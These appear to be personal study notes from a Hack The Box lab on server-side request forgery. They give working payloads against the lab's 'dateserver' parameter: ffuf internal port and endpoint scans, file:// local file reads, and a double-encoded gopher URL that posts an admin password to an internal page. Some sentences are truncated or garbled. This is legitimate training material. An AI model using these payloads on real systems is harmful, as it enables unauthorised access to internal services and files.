# 🏅 SSRF

This type of vulnerability occurs when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL.

If the web server fetches remote resources based on user input, we can trytricking the server into making requests to arbitrary URLs supplied by the attacker

if the web application relies on a user-supplied URL scheme or protocol**,** we can cause undesired behavior with the following basic schemes:

* `http://` and `https://`:  bypass WAFs, access restricted endpoints, or access endpoints in the internal network
* `file://`: read local files on the web server (LFI)
* `gopher://`: This protocol can send arbitrary bytes to the specified address. It can be used to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases

## Identifying SSRF

Let's imagine this website and schedule appointment feature&#x20;

<figure><img src="../../../.gitbook/assets/image (1324).png" alt=""><figcaption></figcaption></figure>

We click the button and capture the request:

<figure><img src="../../../.gitbook/assets/image (1325).png" alt=""><figcaption></figcaption></figure>

the request contains our chosen date and a URL in the parameter `dateserver.`

So that means the web server fetches the availability information from a separate system determined by the URL

We can chnage the url and supply the URL to our system ->

<figure><img src="../../../.gitbook/assets/image (1326).png" alt=""><figcaption></figcaption></figure>

And after setting up a listener, we get a response back, telling us it's indeed SSRF vulnerable:

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

We can now go further and determine if the SSRF is blind or not, let's make the web app call itself with **127.0.0.1**

<figure><img src="../../../.gitbook/assets/image (1327).png" alt=""><figcaption><p>Since the response contains the web application's HTML code, the SSRF vulnerability is not blind</p></figcaption></figure>

Now let's use this to enumerate th

If we supply a port that we assume is closed (such as `81`), the response contains an error message

<figure><img src="../../../.gitbook/assets/image (1328).png" alt=""><figcaption></figcaption></figure>

So here is how to check for all the common ports ->

```shell-session
ElFelixi0@htb[/htb]$ seq 1 10000 > ports.txt
ElFelixi0@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

We need to grep out a part of the error message and we sould we a response like this:

```shell-session
Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

So appart from the port 80 that we know we can see port 3306 that is often related to SQL databases

## Exploiting SSRF

So we know that the request fetches availability information from the URL `dateserver.htb` so we can start by adding this IP to our host file but we still can't access it:

<figure><img src="../../../.gitbook/assets/image (1330).png" alt=""><figcaption></figcaption></figure>

So we can now start and look at potential endpoints that we could access with fuff using a random directory bruteforce wordlist![](<../../../.gitbook/assets/image (1332).png>):

<figure><img src="../../../.gitbook/assets/image (1331).png" alt=""><figcaption><p>404 apache response </p></figcaption></figure>

So in our fuff request we can filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages.

```shell-session
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

And we end up with&#x20;

```shell-session
[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

so we identified an additional internal endpoint that we can now access through the SSRF vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` POST parameter

### Local File Inclusion (LFI)

Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://`

<figure><img src="../../../.gitbook/assets/image (1333).png" alt=""><figcaption></figcaption></figure>

### The gopher Protocol

we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme.

To demonstrate, let's consider that earlier we needed to send a POST request to `/admin.php` containing the password in the `adminpw` POST parameter. However, there is no way to send this POST request using the `http://` URL scheme:

<figure><img src="../../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>

we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

If we wante to target&#x20;

```http
adminpw
```

and don't forget to URL-encode all special characters to construct a valid gopher URL from this

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

#### URL Breakdown

* **Scheme**: `gopher://`
  * Gopher is a protocol designed for distributing, searching, and retrieving documents over the Internet.
* **Host**: `dateserver.htb`
  * The server you are targeting with the Gopher request.
* **Port**: `80`
  * Standard port for HTTP traffic.
* **Path**: `/_POST /admin.php HTTP/1.1`
  * The path starts with an underscore `_`, which is a Gopher convention for denoting a raw request.
  * It constructs a part of the HTTP request: `POST /admin.php HTTP/1.1`.
* **Encoded Content**: `%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin`
  * This section encodes the remaining parts of the HTTP POST request.
  * `%0D%0A` represents carriage return and line feed (`\r`), which are used to separate lines in HTTP headers.

But since we are sending our URL via the POST request that is already encoded, we need to encoded it another time which will turn out like this:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

<figure><img src="../../../.gitbook/assets/image (1335).png" alt=""><figcaption></figcaption></figure>

And just like that we have access to the admin dashboard.

But to bypass the time consuming task of crafting the url alone we can utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us

_**Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag.**_

<figure><img src="../../../.gitbook/assets/image (1336).png" alt=""><figcaption></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.103.145/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -v
```

<figure><img src="../../../.gitbook/assets/image (1337).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1338).png" alt=""><figcaption></figcaption></figure>

## Blind SSRF

We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a `netcat` listener

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

But if we try to point the web app to itself:

<figure><img src="../../../.gitbook/assets/image (1339).png" alt=""><figcaption></figcaption></figure>

We get no HTML response

Our exploitation possibilities are very restricted, we can try and look what the response looks like when dealing with closed ports:

<figure><img src="../../../.gitbook/assets/image (1340).png" alt=""><figcaption></figcaption></figure>

We can see that we get a different error message.&#x20;

It will be far more complicated to identify running services that do not respond with valid HTTP responses.

We can try and using this technique to try and identify files on the server ->

<figure><img src="../../../.gitbook/assets/image (1341).png" alt=""><figcaption><p>good file</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1342).png" alt=""><figcaption><p>Wrong file</p></figcaption></figure>

_**Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?**_

```
ffuf -w num.txt -u http://10.129.75.48/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb:FUZZ&date=2024-01-01" -fr "Something" -v
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
